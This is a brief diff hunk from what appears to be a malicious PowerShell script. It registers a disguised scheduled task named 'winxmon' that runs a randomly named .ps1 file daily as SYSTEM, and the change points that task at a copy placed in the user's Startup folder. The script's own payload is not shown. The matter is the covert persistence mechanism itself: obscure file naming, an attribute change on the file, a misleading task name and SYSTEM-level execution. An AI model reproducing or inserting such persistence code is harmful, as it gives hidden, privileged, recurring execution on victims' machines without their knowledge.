@@ -123,7 +123,7 @@ Set-ItemProperty -Name Attributes -Path "$initial_dir\AEQKCPrkuifY.ps1" -Value "
 
 $TaskName = "winxmon"
 $TaskPath = "C:\Windows\System32\Tasks\$TaskName"
-$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$initial_dir\AEQKCPrkuifY.ps1"
+$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AEQKCPrkuifY.ps1"
 $Trigger = New-ScheduledTaskTrigger -Daily -At 07:00AM
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
